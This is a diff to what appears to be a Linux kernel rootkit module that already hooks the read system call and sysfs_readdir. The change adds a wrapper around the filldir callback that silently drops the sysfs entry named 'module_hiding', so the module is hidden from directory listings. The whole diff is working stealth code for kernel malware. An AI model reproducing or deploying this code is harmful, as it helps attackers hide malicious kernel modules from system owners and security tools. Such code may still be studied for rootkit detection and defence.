@@ -13,6 +13,8 @@ typedef void (*fun_void_charp_int)(char *buf, int size);
 
 static fun_void_charp_int callback_function;
 
+filldir_t original_sysfs_filldir;
+
 static asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
     ssize_t retval;
 
@@ -32,9 +34,18 @@ static void dummy_callback(char* buf, int size){
     //call this when no callback is specified
 }
 
+int hooked_sysfs_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
+    if (strcmp(name, "module_hiding") == 0){
+        OUR_DEBUG("hooked_sysfs_filldir: %s\n", (char*)name);
+        return 0;
+    }
+    return original_sysfs_filldir(__buf, name, namelen, offset, ino, d_type);
+}
+
 int hooked_sysfs_readdir(struct file * filp, void* dirent, filldir_t filldir){
     OUR_DEBUG("Hooked sysfs_readdir.\n");
-    return original_sysfs_readdir(filp, dirent, filldir);
+    original_sysfs_filldir = filldir;
+    return original_sysfs_readdir(filp, dirent, hooked_sysfs_filldir);
 }
 
 /* Hooks the read system call. */
